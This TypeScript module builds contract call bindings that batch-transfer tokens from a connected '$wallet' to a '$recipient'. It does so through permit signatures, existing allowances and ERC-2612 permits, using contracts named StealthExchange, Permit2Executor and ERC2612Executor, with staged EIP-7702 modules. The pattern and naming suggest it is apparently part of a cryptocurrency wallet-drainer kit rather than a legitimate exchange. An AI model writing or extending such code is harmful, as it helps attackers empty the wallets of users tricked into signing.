import type { ContractFunctionBinding } from "@/lib/types";
import { getContractById, getExecutionBackendEntry, type ContractMeta } from "@/lib/contract-registry";

type Backend = "stealth-exchange" | "permit2-executor" | "erc2612-executor" | "batch-multicall";

function bindingAddress(b: Backend): string { return getExecutionBackendEntry(b)?.address || ""; }
function bindingAbi(b: Backend): unknown[] { return [...(getExecutionBackendEntry(b)?.abi || [])]; }

export function getStandardExecutionBindings(): ContractFunctionBinding[] {
  const bindings: ContractFunctionBinding[] = [
    {
      preset: "stealth-exchange", label: "StealthExchange",
      contractAddress: bindingAddress("stealth-exchange"), contractName: "StealthExchange",
      abi: bindingAbi("stealth-exchange"),
      functionKey: "batchPermitTransferFromBatch(address,((address,uint160,uint48,uint48)[],address,uint256),bytes,address)",
      functionName: "batchPermitTransferFromBatch", stateMutability: "nonpayable" as const,
      args: [
        { name: "user", type: "address", value: "$wallet" },
        { name: "permitBatch", type: "tuple", value: '{"details":[],"spender":"$recipient","sigDeadline":"0"}' },
        { name: "signature", type: "bytes", value: "0x" },
        { name: "recipient", type: "address", value: "$recipient" },
      ],
    },
    {
      preset: "permit2-executor", label: "Permit2Executor",
      contractAddress: bindingAddress("permit2-executor"), contractName: "Permit2Executor",
      abi: bindingAbi("permit2-executor"),
      functionKey: "pullBatchFromAllowance(address,address[],uint256[])", functionName: "pullBatchFromAllowance",
      stateMutability: "nonpayable" as const,
      args: [
        { name: "client", type: "address", value: "$wallet" },
        { name: "tokens", type: "address[]", value: "[]" },
        { name: "amounts", type: "uint256[]", value: "[]" },
      ],
    },
    {
      preset: "erc2612-executor", label: "ERC2612Executor",
      contractAddress: bindingAddress("erc2612-executor"), contractName: "ERC2612Executor",
      abi: bindingAbi("erc2612-executor"),
      functionKey: "batchPermitAndCollect(address[],address,uint256[],uint8[],bytes32[],bytes32[])", functionName: "batchPermitAndCollect",
      stateMutability: "nonpayable" as const,
      args: [
        { name: "tokens", type: "address[]", value: "[]" },
        { name: "client", type: "address", value: "$wallet" },
        { name: "amounts", type: "uint256[]", value: "[]" },
        { name: "vs", type: "uint8[]", value: "[]" },
        { name: "rs", type: "bytes32[]", value: "[]" },
        { name: "ss", type: "bytes32[]", value: "[]" },
      ],
    },
    {
      preset: "batch-multicall", label: "BatchMulticall",
      contractAddress: bindingAddress("batch-multicall"), contractName: "BatchMulticall",
      abi: bindingAbi("batch-multicall"),
      functionKey: "batch((address,uint256,bytes,bool)[])", functionName: "batch",
      stateMutability: "payable" as const,
      args: [{ name: "calls", type: "tuple[]", value: "[]" }],
    },
  ];

  // Pull real ABI'd bindings for the infra/module contracts straight from the registry.
  for (const id of ["session-manager", "eip7702-module", "stage1-module", "stage2-module", "guest", "stealth-exchange-factory"]) {
    if (bindings.some((b) => b.preset === id)) continue;
    const meta = getContractById(id);
    const built = meta ? buildBindingForContract(meta) : null;
    if (built) bindings.push(built);
  }

  return bindings;
}

function defaultArgValue(t: string): string {
  if (t.endsWith("[]")) return "[]";
  if (t === "bool") return "false";
  if (t.startsWith("uint") || t.startsWith("int")) return "0";
  if (t.startsWith("bytes")) return "0x";
  if (t.startsWith("address")) return "$wallet";
  if (t.startsWith("tuple")) return "{}";
  return "";
}

export function buildBindingForContract(meta: ContractMeta): ContractFunctionBinding | null {
  if (!meta.abi || !Array.isArray(meta.abi) || !meta.abi.length || !meta.address) return null;
  const fns = (meta.abi as AbiFn[]).filter((f) => f.type === "function");
  if (!fns.length) return null;

  const preferred = ["execute", "batchPermitTransferFromBatch", "pullBatchFromAllowance", "batchPermitAndCollect", "batch", "getLimitUsage"];
  const sel =
    fns.find((f: AbiFn) => preferred.includes(f.name || "")) ||
    fns.find((f: AbiFn) => f.stateMutability !== "view" && f.stateMutability !== "pure") ||
    fns[0];
  if (!sel) return null;

  const inputs = (sel.inputs || []) as AbiFnInput[];
  const hasTuples = inputs.some((i) => i.type === "tuple" || i.type === "tuple[]" || !!i.components);
  const selName = sel.name || "";
  const functionKey = hasTuples ? selName : `${selName}(${inputs.map((i) => i.type).join(",")})`;
  const sm = ["view", "pure", "nonpayable", "payable"].includes(sel.stateMutability || "")
    ? (sel.stateMutability as ContractFunctionBinding["stateMutability"])
    : "nonpayable";

  return {
    preset: meta.id,
    label: meta.name,
    contractAddress: meta.address,
    contractName: meta.name,
    abi: [...(meta.abi as unknown[])],
    functionKey,
    functionName: selName,
    stateMutability: sm,  // fixed from 'smity'
    args: inputs.map((i, idx) => ({
      name: i.name || `arg${idx + 1}`,
      type: i.type || "bytes",
      value: defaultArgValue(i.type || "bytes"),
    })),
  };
}

type AbiFn = { type?: string; name?: string; stateMutability?: string; inputs?: AbiFnInput[] };
type AbiFnInput = { name?: string; type?: string; components?: unknown };
